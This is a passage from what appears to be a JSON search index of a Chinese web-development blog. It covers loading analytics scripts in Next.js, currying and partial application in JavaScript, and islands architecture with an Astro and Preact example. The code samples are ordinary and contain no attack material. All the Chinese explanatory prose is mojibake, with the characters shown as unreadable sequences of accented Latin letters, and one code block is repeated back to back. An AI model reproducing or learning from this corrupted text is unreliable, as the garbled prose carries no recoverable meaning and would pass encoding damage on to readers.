(\r\u0026lt;\u0026gt;\r\u0026lt;Script\rsrc=\u0026#34;https://www.google-analytics.com/analytics.js\u0026#34;\rid=\u0026#34;analytics\u0026#34;\rnonce=\u0026#34;XUENAJFW\u0026#34;\rdata-test=\u0026#34;analytics\u0026#34;\r/\u0026gt;\r\u0026lt;/\u0026gt;\r)\r} åŠ è½½åˆ†æè„šæœ¬ ä½¿ç”¨ Google Analytics (GA) å’Œ Google Tag Manager (GTM) å¯ä»¥é€šè¿‡ä¸åŒçš„æ–¹å¼åœ¨ç½‘ç«™ä¸ŠåŒ…å«åˆ†æã€‚\nå¯ä»¥ä½¿ç”¨è„šæœ¬ç»„ä»¶åœ¨ Next.js ç½‘ç«™ä¸Šä»¥æœ€ä½³æ–¹å¼åŠ è½½ gtag.js æˆ– analytics.js è„šæœ¬ã€‚ æ ¹æ®æ‚¨è¦æ‰§è¡Œè¿™äº›è„šæœ¬çš„ä½ç½®ï¼Œæ‚¨å¯ä»¥åœ¨ _app.jsï¼ˆé€‚ç”¨äºæ‰€æœ‰é¡µé¢ï¼‰æˆ–ç‰¹å®šé¡µé¢ä¸ŠåŠ è½½å®ƒä»¬ã€‚\né€šè¿‡åœ¨ _app.js ä¸­åŒ…å«è„šæœ¬ç»„ä»¶ï¼Œå¯ä»¥ä¸ºç«™ç‚¹ä¸Šçš„æ‰€æœ‰é¡µé¢å¯ç”¨ GTMï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  import Script from \u0026#39;next/script\u0026#39; // + other imports  function MyApp({ Component, pageProps }) { // Other app code  return ( \u0026lt;\u0026gt; {/* Google Tag Manager - Global base code */} \u0026lt;Script strategy=\u0026#34;afterInteractive\u0026#34; dangerouslySetInnerHTML={{ __html: ` (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({\u0026#39;gtm.start\u0026#39;: new Date().getTime(),event:\u0026#39;gtm.js\u0026#39;});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!=\u0026#39;dataLayer\u0026#39;?\u0026#39;\u0026amp;l=\u0026#39;+l:\u0026#39;\u0026#39;;j.async=true;j.src= \u0026#39;https://www.googletagmanager.com/gtm.js?id=\u0026#39;+i+dl;f.parentNode.insertBefore(j,f); })(window,document,\u0026#39;script\u0026#39;,\u0026#39;dataLayer\u0026#39;, \u0026#39;${GTM_ID}\u0026#39;); `, }} /\u0026gt; \u0026lt;Component {...pageProps} /\u0026gt; \u0026lt;/\u0026gt; ) } export default MyApp   ç›¸åï¼Œå¦‚æœæƒ³åœ¨ç‰¹å®šé¡µé¢ä¸ŠåŠ è½½ analytics.jsï¼Œ\nå¯ä»¥å°†å…¶åŒ…å«åœ¨é¡µé¢ä¸­ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚\nimport Script from \u0026#39;next/script\u0026#39;\r//other imports\rconst Home = () =\u0026gt; {\rreturn (\r\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt;\r\u0026lt;Script id=\u0026#34;google-analytics\u0026#34; strategy=\u0026#34;afterInteractive\u0026#34;\u0026gt;\r{`\r(function(i,s,o,g,r,a,m){i[\u0026#39;GoogleAnalyticsObject\u0026#39;]=r;i[r]=i[r]||function(){\r(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),\rm=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)\r})(window,document,\u0026#39;script\u0026#39;,\u0026#39;https://www.google-analytics.com/analytics.js\u0026#39;,\u0026#39;ga\u0026#39;);\rga(\u0026#39;create\u0026#39;, \u0026#39;UA-XXXXX-Y\u0026#39;, \u0026#39;auto\u0026#39;);\rga(\u0026#39;send\u0026#39;, \u0026#39;pageview\u0026#39;);\r`}\r\u0026lt;/Script\u0026gt;\r\u0026lt;/div\u0026gt;\r//Other UI related HTML\r)\r} import Script from \u0026#39;next/script\u0026#39;\r//other imports\rconst Home = () =\u0026gt; {\rreturn (\r\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt;\r\u0026lt;Script id=\u0026#34;google-analytics\u0026#34; strategy=\u0026#34;afterInteractive\u0026#34;\u0026gt;\r{`\r(function(i,s,o,g,r,a,m){i[\u0026#39;GoogleAnalyticsObject\u0026#39;]=r;i[r]=i[r]||function(){\r(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),\rm=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)\r})(window,document,\u0026#39;script\u0026#39;,\u0026#39;https://www.google-analytics.com/analytics.js\u0026#39;,\u0026#39;ga\u0026#39;);\rga(\u0026#39;create\u0026#39;, \u0026#39;UA-XXXXX-Y\u0026#39;, \u0026#39;auto\u0026#39;);\rga(\u0026#39;send\u0026#39;, \u0026#39;pageview\u0026#39;);\r`}\r\u0026lt;/Script\u0026gt;\r\u0026lt;/div\u0026gt;\r//Other UI related HTML\r)\r}\rexport default Home è¯·æ³¨æ„ï¼Œåœ¨ä¸Šé¢çš„ä¸¤ä¸ªç¤ºä¾‹ä¸­ï¼Œåˆ†æè„šæœ¬åŠ è½½äº† strategy = afterInteractiveã€‚\n\rç»“è®º åœ¨å°†æ¥è‡ªæœåŠ¡å™¨çš„èµ„æºä¸æ¥è‡ª Web å…¶ä»–è§’è½çš„èµ„æºç»„åˆèµ·æ¥ç¼–å†™ç½‘é¡µæ—¶ï¼Œå¿…é¡»ç»å¸¸ç›‘è§†è¿™äº›èµ„æºä¹‹é—´çš„ç›¸äº’ä½œç”¨ã€‚\nå¯ä»¥ä»æ­£ç¡®æ’åºèµ„æºå¹¶éµå¾ªæœ€ä½³å®è·µå¼€å§‹ã€‚ è¿˜å¯ä»¥ä¾èµ–åœ¨è®¾è®¡ä¸­å†…ç½®äº†è¿™äº›æœ€ä½³å®è·µçš„æ¡†æ¶æˆ–è§£å†³æ–¹æ¡ˆã€‚\néšç€ç«™ç‚¹çš„å‘å±•ï¼Œæ€§èƒ½æŠ¥å‘Šå’Œå®šæœŸå®¡è®¡å¯ä»¥å¸®åŠ©æ¶ˆé™¤å†—ä½™å¹¶ä¼˜åŒ–å½±å“æ€§èƒ½çš„è„šæœ¬ã€‚\næœ€åï¼Œæˆ‘ä»¬æ€»æ˜¯å¸Œæœ›æœ‰ä¼—æ‰€å‘¨çŸ¥çš„æ€§èƒ½é—®é¢˜çš„ç¬¬ä¸‰æ–¹ä¼šåœ¨ä»–ä»¬çš„æœ€åä¼˜åŒ–ä»£ç æˆ–å…¬å¼€ API ä»¥å¯ç”¨å˜é€šæ–¹æ³•æ¥è§£å†³è¿™äº›é—®é¢˜ã€‚\n\rçŸ¥è¯†ç‚¹   Next.s\n  Partytown\n  ","description":"å‡å°‘ç¬¬ä¸‰æ–¹è„šæœ¬å¯¹ç½‘ç«™çš„æ€§èƒ½å½±å“ã€‚","id":127,"section":"react-patterns","tags":null,"title":"ä¼˜åŒ–åŠ è½½ç¬¬ä¸‰æ–¹","uri":"https://codthing.github.io/react-patterns/performance-patterns/third-party/"},{"content":"arityï¼ˆå‚æ•°ä¸ªæ•°ï¼‰æ˜¯å‡½æ•°æ‰€éœ€çš„å½¢å‚çš„æ•°é‡ã€‚ å‡½æ•°æŸ¯é‡ŒåŒ–ï¼ˆCurryingï¼‰æ„æ€æ˜¯æŠŠæ¥å—å¤šä¸ª arity çš„å‡½æ•°å˜æ¢æˆæ¥å—å•ä¸€ arity çš„å‡½æ•°ã€‚\n\rå‡½æ•°æŸ¯é‡ŒåŒ– arityï¼ˆå‚æ•°ä¸ªæ•°ï¼‰æ˜¯å‡½æ•°æ‰€éœ€çš„å½¢å‚çš„æ•°é‡ã€‚ å‡½æ•°æŸ¯é‡ŒåŒ–ï¼ˆCurryingï¼‰æ„æ€æ˜¯æŠŠæ¥å—å¤šä¸ª arity çš„å‡½æ•°å˜æ¢æˆæ¥å—å•ä¸€ arity çš„å‡½æ•°ã€‚\næ¢å¥è¯è¯´ï¼Œå°±æ˜¯é‡æ„å‡½æ•°è®©å®ƒæ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œç„¶åè¿”å›æ¥æ”¶ä¸‹ä¸€ä¸ªå‚æ•°çš„å‡½æ•°ï¼Œä¾æ­¤ç±»æ¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13  function unCurried(x, y) { return x + y; } function curried(x) { return function(y) { return x + y; } } const curried = x =\u0026gt; y =\u0026gt; x + y curried(1)(2) // 3   æŸ¯é‡ŒåŒ–åœ¨ä¸èƒ½ä¸€æ¬¡ä¸ºå‡½æ•°æä¾›æ‰€æœ‰å‚æ•°æƒ…å†µä¸‹å¾ˆæœ‰ç”¨ã€‚\nå› ä¸ºå®ƒå¯ä»¥å°†æ¯ä¸ªå‡½æ•°çš„è°ƒç”¨ä¿å­˜åˆ°ä¸€ä¸ªå˜é‡ä¸­ï¼Œè¯¥å˜é‡å°†ä¿å­˜è¿”å›çš„å‡½æ•°å¼•ç”¨ï¼Œè¯¥å¼•ç”¨åœ¨ä¸‹ä¸€ä¸ªå‚æ•°å¯ç”¨æ—¶æ¥å—è¯¥å‚æ•°ã€‚\nä¸‹é¢æ˜¯ä½¿ç”¨æŸ¯é‡ŒåŒ–å‡½æ•°çš„ä¾‹å­ï¼š\n1 2  const funcForY = curried(1); console.log(funcForY(2)); // 3   å±€éƒ¨è°ƒç”¨ ç±»ä¼¼åœ°ï¼Œ**å±€éƒ¨è°ƒç”¨ï¼ˆ partial applicationï¼‰**çš„æ„æ€æ˜¯ä¸€æ¬¡å¯¹ä¸€ä¸ªå‡½æ•°åº”ç”¨å‡ ä¸ªå‚æ•°ï¼Œç„¶åè¿”å›å¦ä¸€ä¸ªåº”ç”¨æ›´å¤šå‚æ•°çš„å‡½æ•°ã€‚\nè¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š\n1 2 3 4 5 6  function impartial(x, y, z) { return x + y + z; } const partialFn = impartial.bind(this, 1, 2); partialFn(10); // 13   å¡«å†™ add å‡½æ•°ä¸»ä½“éƒ¨åˆ†ï¼Œç”¨æŸ¯é‡ŒåŒ–æ·»åŠ å‚æ•° xï¼Œy å’Œ z.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  function add(x) { // return function (y) {  // return function (z) {  // return x + y + z;  // };  // };  // æˆ–è€…  return y =\u0026gt; z =\u0026gt; x + y + z; } add(10)(20)(30); // 60   ","description":"arityï¼ˆå‚æ•°ä¸ªæ•°ï¼‰æ˜¯å‡½æ•°æ‰€éœ€çš„å½¢å‚çš„æ•°é‡ã€‚ å‡½æ•°æŸ¯é‡ŒåŒ–ï¼ˆCurryingï¼‰æ„æ€æ˜¯æŠŠæ¥å—å¤šä¸ª arity çš„å‡½æ•°å˜æ¢æˆæ¥å—å•ä¸€ arity çš„å‡½æ•°ã€‚","id":128,"section":"javascript","tags":null,"title":"å‡½æ•°æŸ¯é‡ŒåŒ–å’Œå±€éƒ¨è°ƒç”¨","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/currying-programming/"},{"content":"å²›å±¿æ¶æ„é¼“åŠ±åœ¨æœåŠ¡å™¨æ¸²æŸ“çš„ç½‘é¡µä¸­è¿›è¡Œå°çš„ã€é›†ä¸­çš„äº¤äº’å—ã€‚\nå²›å±¿çš„è¾“å‡ºæ˜¯é€æ­¥å¢å¼ºçš„ HTMLï¼Œåœ¨å¢å¼ºå‘ç”Ÿçš„æ–¹å¼ä¸Šå…·æœ‰æ›´å¤šçš„ç‰¹å¼‚æ€§ã€‚\nä¸æ˜¯å•ä¸ªåº”ç”¨ç¨‹åºæ§åˆ¶æ•´é¡µå‘ˆç°ï¼Œè€Œæ˜¯æœ‰å¤šä¸ªå…¥å£ç‚¹ã€‚\nè¿™äº›äº¤äº’æ€§â€œå­¤å²›â€çš„è„šæœ¬å¯ä»¥ç‹¬ç«‹äº¤ä»˜å’Œæ°´åˆï¼Œå…è®¸é¡µé¢çš„å…¶ä½™éƒ¨åˆ†åªæ˜¯é™æ€ HTMLã€‚\nåŠ è½½å’Œå¤„ç†è¿‡å¤šçš„ JavaScript ä¼šå½±å“æ€§èƒ½ã€‚ ä½†æ˜¯ï¼Œé€šå¸¸éœ€è¦ä¸€å®šç¨‹åº¦çš„äº¤äº’æ€§å’Œ JavaScriptï¼Œå³ä½¿åœ¨ä¸»è¦æ˜¯é™æ€ç½‘ç«™ä¸­ä¹Ÿæ˜¯å¦‚æ­¤ã€‚\næˆ‘ä»¬å·²ç»è®¨è®ºäº†æœåŠ¡å™¨ç«¯æ¸²æŸ“ (SSR) çš„å˜ä½“ï¼Œè¿™äº›å˜ä½“ä½¿æ‚¨èƒ½å¤Ÿæ„å»ºå°è¯•åœ¨ä»¥ä¸‹å„é¡¹ä¹‹é—´æ‰¾åˆ°å¹³è¡¡çš„åº”ç”¨ç¨‹åºï¼š\n  ä¸å®¢æˆ·ç«¯æ¸²æŸ“ (CSR) åº”ç”¨ç¨‹åºç›¸å½“çš„äº¤äº’æ€§\n  ä¸ SSR åº”ç”¨ç¨‹åºç›¸å½“çš„ SEO ä¼˜åŠ¿\n  SSR çš„æ ¸å¿ƒåŸåˆ™æ˜¯ HTML åœ¨æœåŠ¡å™¨ä¸Šå‘ˆç°ï¼Œå¹¶é™„å¸¦å¿…è¦çš„ JavaScriptï¼Œä»¥ä¾¿åœ¨å®¢æˆ·ç«¯å¯¹å…¶é‡æ–°æ°´åˆã€‚\nRehydration æ˜¯åœ¨æœåŠ¡ç«¯æ¸²æŸ“ååœ¨å®¢æˆ·ç«¯é‡æ–°ç”Ÿæˆ UI ç»„ä»¶çŠ¶æ€çš„è¿‡ç¨‹ã€‚\nç”±äºå†æ°´åŒ–æ˜¯æœ‰ä»£ä»·çš„ï¼ŒSSR çš„æ¯ä¸ªå˜ä½“éƒ½è¯•å›¾ä¼˜åŒ–å†æ°´åŒ–è¿‡ç¨‹ã€‚\nè¿™ä¸»è¦æ˜¯é€šè¿‡å…³é”®ç»„ä»¶çš„éƒ¨åˆ†æ°´åˆæˆ–ç»„ä»¶åœ¨æ¸²æŸ“æ—¶çš„æµæ¥å®ç°çš„ã€‚\nç„¶è€Œï¼Œåœ¨ä¸Šè¿°æŠ€æœ¯ä¸­æœ€ç»ˆäº¤ä»˜çš„ç½‘ç»œ JavaScript ä¿æŒä¸å˜ã€‚\n\rå²›å±¿æ¶æ„ å²›å±¿æ¶æ„ä¸€è¯ç”± Katie Sylor-Miller å’Œ Jason Miller æ¨å¹¿ï¼Œç”¨æ¥æè¿°ä¸€ç§èŒƒå¼ï¼Œæ—¨åœ¨å‡å°‘é€šè¿‡äº¤äº’â€œå­¤å²›â€ä¼ è¾“çš„ JavaScript é‡ï¼Œè¿™äº›äº¤äº’â€œå­¤å²›â€å¯ä»¥åœ¨å…¶ä»–é™æ€ HTML ä¹‹ä¸Šç‹¬ç«‹äº¤ä»˜ã€‚\nå­¤å²›æ˜¯ä¸€ç§åŸºäºç»„ä»¶çš„ä½“ç³»ç»“æ„ï¼Œå®ƒå»ºè®®ä½¿ç”¨é™æ€å’ŒåŠ¨æ€å­¤å²›æ¥åˆ’åˆ†é¡µé¢è§†å›¾ã€‚\n  é¡µé¢çš„é™æ€åŒºåŸŸæ˜¯çº¯éäº¤äº’å¼ HTMLï¼Œä¸éœ€è¦åŠ æ°´ã€‚\n  åŠ¨æ€åŒºåŸŸæ˜¯ HTML å’Œè„šæœ¬çš„ç»„åˆï¼Œèƒ½å¤Ÿåœ¨æ¸²æŸ“åè‡ªæˆ‘ä¿®å¤ã€‚\n  è®©æˆ‘ä»¬é€šè¿‡ç›®å‰å¯ç”¨çš„ä¸åŒé€‰é¡¹æ¥æ›´è¯¦ç»†åœ°æ¢ç´¢ Islands æ¶æ„ã€‚\n\råŠ¨æ€ç»„ä»¶å²› å¤§å¤šæ•°é¡µé¢æ˜¯é™æ€å’ŒåŠ¨æ€å†…å®¹çš„ç»„åˆã€‚ é€šå¸¸ï¼Œä¸€ä¸ªé¡µé¢ç”±é™æ€å†…å®¹å’Œä¸€äº›å¯ä»¥éš”ç¦»çš„äº¤äº’åŒºåŸŸç»„æˆã€‚ ä¾‹å¦‚;\n  åšå®¢æ–‡ç« ã€æ–°é—»æ–‡ç« å’Œç»„ç»‡ä¸»é¡µåŒ…å«æ–‡æœ¬å’Œå›¾åƒä»¥åŠç¤¾äº¤åª’ä½“åµŒå…¥å’ŒèŠå¤©ç­‰äº¤äº’å¼ç»„ä»¶ã€‚\n  ç”µå­å•†åŠ¡ç½‘ç«™ä¸Šçš„äº§å“é¡µé¢åŒ…å«é™æ€äº§å“æè¿°å’Œåº”ç”¨ç¨‹åºå…¶ä»–é¡µé¢çš„é“¾æ¥ã€‚ å›¾åƒè½®æ’­å’Œæœç´¢ç­‰äº¤äº’ç»„ä»¶å¯åœ¨é¡µé¢çš„ä¸åŒåŒºåŸŸä½¿ç”¨ã€‚\n  ä¸€ä¸ªå…¸å‹çš„é“¶è¡Œè´¦æˆ·è¯¦ç»†ä¿¡æ¯é¡µé¢åŒ…å«ä¸€ä¸ªé™æ€äº¤æ˜“åˆ—è¡¨ï¼Œå¸¦æœ‰æä¾›ä¸€äº›äº¤äº’æ€§çš„è¿‡æ»¤å™¨ã€‚\n  é™æ€å†…å®¹æ˜¯æ— çŠ¶æ€çš„ï¼Œä¸ä¼šè§¦å‘äº‹ä»¶ï¼Œå¹¶ä¸”åœ¨æ¸²æŸ“åä¸éœ€è¦é‡æ–°æ°´åŒ–ã€‚\næ¸²æŸ“åï¼ŒåŠ¨æ€å†…å®¹ï¼ˆæŒ‰é’®ã€è¿‡æ»¤å™¨ã€æœç´¢æ ï¼‰å¿…é¡»é‡æ–°è¿æ¥åˆ°å…¶äº‹ä»¶ã€‚ DOM å¿…é¡»åœ¨å®¢æˆ·ç«¯ï¼ˆè™šæ‹Ÿ DOMï¼‰é‡æ–°ç”Ÿæˆã€‚ è¿™ç§å†ç”Ÿã€å†æ°´åŒ–å’Œäº‹ä»¶å¤„ç†åŠŸèƒ½æœ‰åŠ©äºå°† JavaScript å‘é€åˆ°å®¢æˆ·ç«¯ã€‚\nIslands æ¶æ„æœ‰åŠ©äºåœ¨æœåŠ¡å™¨ç«¯å‘ˆç°é¡µé¢åŠå…¶æ‰€æœ‰é™æ€å†…å®¹ã€‚ ä½†æ˜¯ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‘ˆç°çš„ HTML å°†åŒ…å«åŠ¨æ€å†…å®¹çš„å ä½ç¬¦ã€‚ åŠ¨æ€å†…å®¹å ä½ç¬¦åŒ…å«è‡ªåŒ…å«çš„ç»„ä»¶å°éƒ¨ä»¶ã€‚ æ¯ä¸ªå°éƒ¨ä»¶ç±»ä¼¼äºä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œå¹¶ç»“åˆäº†æœåŠ¡å™¨æ¸²æŸ“çš„è¾“å‡ºå’Œç”¨äºåœ¨å®¢æˆ·ç«¯ä¸Šä¸ºåº”ç”¨ç¨‹åºæ·»åŠ æ°´çš„ JavaScriptã€‚\nåœ¨æ¸è¿›å¼è¡¥æ°´ä¸­ï¼Œé¡µé¢çš„è¡¥æ°´æ¶æ„æ˜¯è‡ªä¸Šè€Œä¸‹çš„ã€‚ è¯¥é¡µé¢æ§åˆ¶å„ä¸ªç»„ä»¶çš„è°ƒåº¦å’Œæ°´åˆã€‚ æ¯ä¸ªç»„ä»¶åœ¨ Islands æ¶æ„ä¸­éƒ½æœ‰è‡ªå·±çš„ hydration è„šæœ¬ï¼Œè¯¥è„šæœ¬å¼‚æ­¥æ‰§è¡Œï¼Œç‹¬ç«‹äºé¡µé¢ä¸Šçš„ä»»ä½•å…¶ä»–è„šæœ¬ã€‚ ä¸€ä¸ªç»„ä»¶ä¸­çš„æ€§èƒ½é—®é¢˜ä¸åº”å½±å“å¦ä¸€ä¸ªã€‚\n\rå®æ–½å²› Island æ¶æ„å€Ÿé‰´äº†ä¸åŒæ¥æºçš„æ¦‚å¿µï¼Œæ—¨åœ¨å°†å®ƒä»¬ä¼˜åŒ–ç»„åˆã€‚ Jekyll å’Œ Hugo ç­‰åŸºäºæ¨¡æ¿çš„é™æ€ç«™ç‚¹ç”Ÿæˆå™¨æ”¯æŒå°†é™æ€ç»„ä»¶æ¸²æŸ“åˆ°é¡µé¢ã€‚ å¤§å¤šæ•°ç°ä»£ JavaScript æ¡†æ¶è¿˜æ”¯æŒåŒæ„æ¸²æŸ“ï¼Œè¿™å…è®¸æ‚¨ä½¿ç”¨ç›¸åŒçš„ä»£ç åœ¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¸Šæ¸²æŸ“å…ƒç´ ã€‚\nJason çš„å¸–å­å»ºè®®ä½¿ç”¨ requestIdleCallback() æ¥å®ç°ä¸€ç§ç”¨äºè¡¥æ°´ç»„ä»¶çš„è°ƒåº¦æ–¹æ³•ã€‚ å¯ä»¥å°†ç»„ä»¶çº§éƒ¨åˆ†æ°´åŒ–çš„é™æ€åŒæ„æ¸²æŸ“å’Œè°ƒåº¦æ„å»ºåˆ°æ¡†æ¶ä¸­ä»¥æ”¯æŒå²›å±¿æ¶æ„ã€‚ å› æ­¤ï¼Œè¯¥æ¡†æ¶åº”\n  æ”¯æŒåœ¨æœåŠ¡å™¨ä¸Šä½¿ç”¨é›¶ JavaScript é™æ€å‘ˆç°é¡µé¢ã€‚\n  æ”¯æŒé€šè¿‡é™æ€å†…å®¹ä¸­çš„å ä½ç¬¦åµŒå…¥ç‹¬ç«‹çš„åŠ¨æ€ç»„ä»¶ã€‚ æ¯ä¸ªåŠ¨æ€ç»„ä»¶éƒ½åŒ…å«å®ƒçš„è„šæœ¬ï¼Œä¸€æ—¦ä¸»çº¿ç¨‹ç©ºé—²ï¼Œå°±å¯ä»¥ä½¿ç”¨ requestIdleCallback() å°†å…¶è‡ªèº«æ°´åŒ–ã€‚\n  å…è®¸åŒæ„æ¸²æŸ“æœåŠ¡å™¨ä¸Šçš„ç»„ä»¶ä¸å®¢æˆ·ç«¯çš„ hydration ä»¥è¯†åˆ«ä¸¤ç«¯çš„ç›¸åŒç»„ä»¶ã€‚\n  å¯ä»¥ä½¿ç”¨ä¸‹é¢è®¨è®ºçš„å¼€ç®±å³ç”¨é€‰é¡¹ä¹‹ä¸€æ¥å®ç°è¿™ä¸€ç‚¹ã€‚\næ¶æ„ å¦‚ä»Šï¼Œä¸åŒçš„æ¡†æ¶éƒ½èƒ½å¤Ÿæ”¯æŒ Islands æ¶æ„ã€‚ å…¶ä¸­å€¼å¾—æ³¨æ„çš„æ˜¯\n Markoï¼š  Marko æ˜¯ä¸€ä¸ªç”± eBay å¼€å‘å’Œç»´æŠ¤çš„å¼€æºæ¡†æ¶ï¼Œç”¨äºæé«˜æœåŠ¡å™¨æ¸²æŸ“æ€§èƒ½ã€‚\nå®ƒé€šè¿‡å°†æµå¼æ¸²æŸ“ä¸è‡ªåŠ¨éƒ¨åˆ†æ°´åŒ–ç›¸ç»“åˆæ¥æ”¯æŒå²›å±¿æ¶æ„ã€‚ HTML å’Œå…¶ä»–é™æ€èµ„äº§ä¸€å‡†å¤‡å¥½å°±æµå¼ä¼ è¾“åˆ°å®¢æˆ·ç«¯ã€‚è‡ªåŠ¨éƒ¨åˆ†æ°´åˆå…è®¸äº¤äº’å¼ç»„ä»¶è‡ªè¡Œæ°´åˆã€‚\nHydration ä»£ç ä»…ç”¨äºäº¤äº’å¼ç»„ä»¶ï¼Œå¯ä»¥æ›´æ”¹æµè§ˆå™¨ä¸Šçš„çŠ¶æ€ã€‚å®ƒæ˜¯åŒæ„çš„ï¼Œå¹¶ä¸” Marko ç¼–è¯‘å™¨ä¼šæ ¹æ®å®ƒå°†è¿è¡Œçš„ä½ç½®ï¼ˆå®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨ï¼‰ç”Ÿæˆä¼˜åŒ–çš„ä»£ç ã€‚\nAstroï¼š  Astro æ˜¯ä¸€ä¸ªé™æ€ç«™ç‚¹æ„å»ºå™¨ï¼Œå¯ä»¥ä» Reactã€Preactã€Svelteã€Vue ç­‰å…¶ä»–æ¡†æ¶ä¸­æ„å»ºçš„ UI ç»„ä»¶ç”Ÿæˆè½»é‡çº§é™æ€ HTML é¡µé¢ã€‚\néœ€è¦å®¢æˆ·ç«¯ JavaScript çš„ç»„ä»¶ä¸å…¶ä¾èµ–é¡¹å•ç‹¬åŠ è½½ã€‚å› æ­¤ï¼Œå®ƒæä¾›äº†å†…ç½®çš„éƒ¨åˆ†æ°´åˆä½œç”¨ã€‚ Astro è¿˜å¯ä»¥å»¶è¿ŸåŠ è½½ç»„ä»¶ï¼Œå…·ä½“å–å†³äºå®ƒä»¬ä½•æ—¶å¯è§ã€‚æˆ‘ä»¬åœ¨ä¸‹ä¸€èŠ‚ä¸­åŒ…å«äº†ä¸€ä¸ªä½¿ç”¨ Astro çš„ç¤ºä¾‹å®ç°ã€‚\nEleventy + Preactï¼š  Markus Oberlehner æ¼”ç¤ºäº† Eleventy çš„ä½¿ç”¨ï¼Œè¿™æ˜¯ä¸€ä¸ªé™æ€ç«™ç‚¹ç”Ÿæˆå™¨ï¼Œå…·æœ‰å¯ä»¥éƒ¨åˆ†æ°´åˆçš„åŒæ„ Preact ç»„ä»¶ã€‚\nå®ƒè¿˜æ”¯æŒæ‡’æƒ°çš„æ°´åˆä½œç”¨ã€‚ç»„ä»¶æœ¬èº«å£°æ˜æ€§åœ°æ§åˆ¶ç»„ä»¶çš„æ°´åˆä½œç”¨ã€‚äº¤äº’å¼ç»„ä»¶ä½¿ç”¨ WithHydration åŒ…è£…å™¨ï¼Œä»¥ä¾¿å®ƒä»¬åœ¨å®¢æˆ·ç«¯ä¸Šæ°´åˆã€‚\nè¯·æ³¨æ„ï¼ŒMarko å’Œ Eleventy æ—©äº Jason æä¾›çš„å²›å±¿å®šä¹‰ï¼Œä½†åŒ…å«æ”¯æŒå®ƒæ‰€éœ€çš„ä¸€äº›åŠŸèƒ½ã€‚ ç„¶è€Œï¼ŒAstro æ˜¯åŸºäºå®šä¹‰æ„å»ºçš„ï¼Œå¹¶ä¸”æœ¬è´¨ä¸Šæ”¯æŒ Islands æ¶æ„ã€‚\nåœ¨ä¸‹ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æ¼”ç¤ºå¦‚ä½•åœ¨å‰é¢è®¨è®ºçš„ç®€å•åšå®¢é¡µé¢ç¤ºä¾‹ä¸­ä½¿ç”¨ Astroã€‚\n\rç¤ºä¾‹å®ç° ä»¥ä¸‹æ˜¯ä½¿ç”¨ Astro å®ç°çš„ç¤ºä¾‹åšå®¢é¡µé¢ã€‚ SamplePost é¡µé¢å¯¼å…¥äº†ä¸€ä¸ªäº¤äº’å¼ç»„ä»¶ SocialButtonsã€‚ è¯¥ç»„ä»¶é€šè¿‡æ ‡è®°åŒ…å«åœ¨ HTML ä¸­æ‰€éœ€çš„ä½ç½®ã€‚\nAstro page (SamplePost.astro)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  --- // Component Imports import { SocialButtons } from \u0026#39;../../components/SocialButtons.tsx\u0026#39;; --- \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/blog.css\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;layout\u0026#34;\u0026gt; \u0026lt;article class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;section class=\u0026#34;intro\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;title\u0026#34;\u0026gt;Post title (static)\u0026lt;/h1\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;p\u0026gt;Post sub-title (static)\u0026lt;/p\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;intro\u0026#34;\u0026gt; \u0026lt;p\u0026gt;This is the post content with images that is rendered by the server.\u0026lt;/p\u0026gt; \u0026lt;img src=\u0026#34;https://source.unsplash.com/user/c_v_r/200x200\u0026#34; /\u0026gt; \u0026lt;p\u0026gt;The next section contains the interactive social buttons component which includes its script.\u0026lt;/p\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;social\u0026#34;\u0026gt; \u0026lt;div\u0026gt; \u0026lt;SocialButtons client:visible\u0026gt;\u0026lt;/SocialButtons\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;/article\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   SocialButtons ç»„ä»¶æ˜¯ä¸€ä¸ª Preact ç»„ä»¶ï¼Œå¸¦æœ‰å®ƒçš„ HTML å’Œç›¸åº”çš„äº‹ä»¶å¤„ç†ç¨‹åºã€‚\nSocialButtons component (SocialButtons.tsx)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  import { useState } from \u0026#39;preact/hooks\u0026#39;; /** a counter written in Preact */ export function SocialButtons() { const [count, setCount] = useState(0); const add = () =\u0026gt; setCount((i) =\u0026gt; i + 1); const subtract = () =\u0026gt; setCount((i) =\u0026gt; i - 1); return ( \u0026lt;\u0026gt; \u0026lt;div\u0026gt; {count} people liked this post \u0026lt;/div\u0026gt; \u0026lt;div align=\u0026#34;right\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/like.png\u0026#34; width=\u0026#34;32\u0026#34; 